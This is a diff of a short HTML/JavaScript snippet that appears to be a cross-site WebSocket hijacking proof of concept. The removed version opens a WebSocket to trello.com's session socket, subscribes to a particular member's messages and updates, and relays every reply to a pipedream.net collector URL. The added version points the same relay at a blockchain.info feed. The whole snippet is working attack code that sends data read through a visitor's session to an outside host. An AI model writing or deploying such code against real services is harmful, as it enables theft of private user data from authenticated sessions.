@@ -1,11 +1,11 @@
 <script>
-websocket = new WebSocket('wss://trello.com/1/Session/socket')
+websocket = new WebSocket('wss://ws.blockchain.info/coins')
 websocket.onopen = start
 websocket.onmessage = handleReply
 function start(event) {
-  websocket.send("{"type":"subscribe","modelType":"Member","idModel":"5a4a92832138be0d1d4669fd","tags":["messages","updates"],"invitationTokens":[],"reqid":2}");
+  websocket.send("READY");
 }
 function handleReply(event) {
-  fetch('https://ena0dx0vz3vo9.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
+  fetch('https://enebmn3o8ax5r.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
 }
-</script> 
+</script>
